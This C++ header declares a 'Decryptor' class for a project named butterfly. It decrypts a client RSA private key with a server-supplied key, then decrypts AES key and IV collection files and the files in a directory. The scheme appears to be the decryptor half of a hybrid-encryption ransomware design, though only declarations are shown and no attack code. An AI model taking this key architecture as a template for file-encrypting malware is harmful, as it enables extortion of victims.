
#ifndef BUTTERFLY_DECRYPTOR_H
#define BUTTERFLY_DECRYPTOR_H

#include "crypto/rsaDecryptor.h"
#include "crypto/aesDecryptor.h"
#include "directoryIterator.h"
#include "aesKeyDatabase.h"
#include "params.h"

namespace butterfly
{

namespace hybrid
{

/**
 * Class Decryptor to decrypt the AES Key collection file and the CPrivateRSA key
 */
class Decryptor
{

private:
    std::string _decryptedCPrivateRSA, _decryptedAESKey, _decryptedAESIV, _aesKeyDbFilepath;;
    std::shared_ptr<rsa::RSADecryptor> _rsaDecryptorAESKey, _rsaDecryptorAESIV, _rsaDecryptorCPrivateRSA;
    std::unique_ptr<aes::AESDecryptor> _aesDecryptor;
    std::unique_ptr<AESKeyDatabase> _aesKeyDatabase;

public:
    /**
     * Constructor Decryptor
     */
    Decryptor(const std::string &aesKeyDbFilepath = "AES.db");

    /**
     * Destructor Decryptor
     */
    ~Decryptor();

    void startWithDir(const std::string &path);
    /**
     * Decrypt the CPrivateRSA binary file
     *
     * @param keyFromServer: SPrivateRSA.pem from server
     * @return decrypted CPrivateRSA string
     */
    std::string decryptCPrivateRSA(const std::string &keyFromServer);

    /**
     * Decrypt the AES Key Collection file
     *
     * @param decryptedCPrivateRSA: decrypted CPrivateRSA string
     * @return decrpyted AES Key Collection file
     */
    std::string decryptAESKeyFile(const std::string &aesKeyFile);
    std::string decryptAESIVFile(const std::string &aesKeyFile);
    /**
     * Decrypt the file with the AES Key
     *
     * @param filepath: path to the file
     * @param aesKey: aes key for the file
     */
    void decryptFileWithAES(const std::string &filepath, const std::string &aesKey, const std::string & aesIV);
    std::string  decryptAESKey(const std::string &cprivate, const std::string &filename);
};

} // namespace hybrid

} // namespace butterfly

#endif //BUTTERFLY_DECRYPTOR_H
